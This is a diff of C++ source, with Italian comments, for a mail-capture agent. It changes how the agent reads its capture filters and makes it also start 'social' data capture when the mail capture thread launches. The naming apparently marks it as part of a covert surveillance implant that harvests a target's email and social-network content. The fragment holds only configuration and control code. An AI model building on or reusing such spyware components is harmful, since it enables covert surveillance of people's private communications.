@@ -1,21 +1,12 @@
 #include "HM_MailAgent/MailAgent.h"
 
-#pragma pack(4)
-typedef struct {
-	DWORD unused;			 // must be zero
-	FILETIME min_date;
-	FILETIME max_date;
-	DWORD max_size;
-	WCHAR search_string[1];  //DEVE essere necessariamente NULL terminata
-} mail_conf_struct;
-#pragma pack()
-
 #define MAIL_SLEEP_TIME 200000 //millisecondi 
+extern void StartSocialCapture(); // Per far partire le opzioni "social"
 
 // Globals
 BOOL g_bMailForceExit = FALSE;		// Semaforo per l'uscita del thread (e da tutti i clicli nelle funzioni chiamate)
-BOOL bPM_MailCapStarted = FALSE;	// Indica se l'agente e' attivo o meno
 HANDLE hMailCapThread = NULL;		// Thread di cattura
+//BOOL bPM_MailCapStarted;			// Indica se l'agente e' attivo o meno
 mail_filter_struct g_mail_filter;	// Filtri di cattura usati dal thread
 
 
@@ -67,6 +58,11 @@ DWORD __stdcall PM_MailCapStartStop(BOOL bStartFlag, BOOL bReset)
 	if (bStartFlag) {
 		// Crea il thread che cattura le mail
 		hMailCapThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CaptureMailThread, NULL, 0, &dummy);
+
+		// Fa partire il processo per la cattura dei dati socia.
+		// Se inserisco una opzione per abilitare o meno la cattura dei social,
+		// questa funzione va chiamata solo se l'opzione e' attiva.
+		StartSocialCapture();
 	} else {
 		// All'inizio non si stoppa perche' l'agent e' gia' nella condizione
 		// stoppata (bPM_SnapShotStarted = bStartFlag = FALSE)
@@ -77,29 +73,35 @@ DWORD __stdcall PM_MailCapStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_MailCapInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_MailCapInit(JSONObject elem)
 {
-	mail_conf_struct *mail_conf_ptr = (mail_conf_struct *)conf_ptr;
+	JSONObject mail, filter;
+	FILETIME ftime;
 
-	if (conf_ptr) {
-		g_mail_filter.max_size = mail_conf_ptr->max_size;
-		g_mail_filter.min_date.dwHighDateTime = mail_conf_ptr->min_date.dwHighDateTime; 
-		g_mail_filter.min_date.dwLowDateTime = mail_conf_ptr->min_date.dwLowDateTime;
-		g_mail_filter.max_date.dwHighDateTime = mail_conf_ptr->max_date.dwHighDateTime; 
-		g_mail_filter.max_date.dwLowDateTime = mail_conf_ptr->max_date.dwLowDateTime;
-		_snwprintf_s(g_mail_filter.search_string, sizeof(g_mail_filter.search_string)/sizeof(WCHAR), _TRUNCATE, L"*%s*", mail_conf_ptr->search_string);				
-	} else {
-		// Di default non ha filtro per date ne' testuale ne' per size
-		g_mail_filter.max_size = 0xFFFFFFFF;
-		g_mail_filter.min_date.dwHighDateTime = 0; 
-		g_mail_filter.min_date.dwLowDateTime = 0;
-		g_mail_filter.max_date.dwHighDateTime = 0xFFFFFFFF; 
-		g_mail_filter.max_date.dwLowDateTime = 0xFFFFFFFF;
-		g_mail_filter.search_string[0] = L'*';
-		g_mail_filter.search_string[1] = 0;
+	if (!elem[L"mail"]->IsObject())
+		return 1;
+
+	mail = elem[L"mail"]->AsObject();
+
+	if (!mail[L"filter"]->IsObject())
+		return 1;
+
+	filter = mail[L"filter"]->AsObject();
+	g_mail_filter.max_size = (DWORD) filter[L"maxsize"]->AsNumber();
+	g_mail_filter.search_string[0] = L'*';
+	g_mail_filter.search_string[1] = 0;
+	
+	HM_TimeStringToFileTime(filter[L"datefrom"]->AsString().c_str(), &g_mail_filter.min_date);
+			
+	if (filter[L"dateto"]) 
+		HM_TimeStringToFileTime(filter[L"dateto"]->AsString().c_str(), &g_mail_filter.max_date);	
+	else {
+		g_mail_filter.max_date.dwHighDateTime = 0xffffffff;
+		g_mail_filter.max_date.dwLowDateTime = 0xffffffff;
 	}
 
-	PM_MailCapStartStop(bStartFlag, TRUE);
+	max_social_mail_len = g_mail_filter.max_size;
+
 	return 1;
 }
 
@@ -119,6 +121,6 @@ DWORD __stdcall PM_MailCapUnregister()
 
 void PM_MailCapRegister()
 {
-	AM_MonitorRegister(PM_MAILAGENT, NULL, (BYTE *)PM_MailCapStartStop, (BYTE *)PM_MailCapInit, (BYTE *)PM_MailCapUnregister);
-	PM_MailCapInit(NULL, FALSE);
+	bPM_MailCapStarted = FALSE;
+	AM_MonitorRegister(L"messages", PM_MAILAGENT, NULL, (BYTE *)PM_MailCapStartStop, (BYTE *)PM_MailCapInit, (BYTE *)PM_MailCapUnregister);
 }
